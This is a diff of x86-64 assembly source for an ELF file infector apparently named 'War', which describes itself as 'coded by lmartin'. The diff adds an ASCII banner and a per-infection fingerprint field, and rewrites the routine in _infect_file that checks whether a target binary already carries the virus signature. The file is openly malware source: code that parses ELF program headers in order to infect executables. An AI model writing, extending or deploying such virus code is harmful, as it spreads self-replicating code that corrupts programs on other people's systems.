@@ -1,3 +1,11 @@
+;------------------------------------------------------------------------------;
+;|                   This is   __    __                                        |
+;|                            / / /\ \ \__ _ _ __                              |
+;|                            \ \/  \/ / _  |  __|                             |
+;|                             \  /\  / (_| | |                                |
+;|                              \/  \/ \__,_|_|                                |
+;-------------------------------------------------------------------------------
+
 %include "war.inc"
 
 section.text:
@@ -24,7 +32,9 @@ _params:; filled for infected binaries
 _start:
 	call _h3ll0w0rld; push addr to stack
 
-signature db `War version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
+len_signature dq 0x34; stop at `lmartin`
+signature db `War version 1.0 (c)oded by lmartin - `; sw4g signature
+fingerprint db `00000000`, 0x0
 
 _h3ll0w0rld:
 	pop r8; pop addr from stack
@@ -727,12 +737,8 @@ _infect_file: ; (string rdi, stat rsi)
 				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
 			jmp .find_segment_exec
 		.check_if_infected:
-			lea rdi, [rel signature]
-			call _ft_strlen
-			push rax
-			pop rcx
-			push rdi
-			pop rdx
+			lea rdx, [rel signature]
+			mov rcx, [rel len_signature]
 			mov rdi, [rbx + P_OFFSET]; p_offset
 			add rdi, r13
 			mov rsi, [rbx + P_FILESZ]; p_filesz
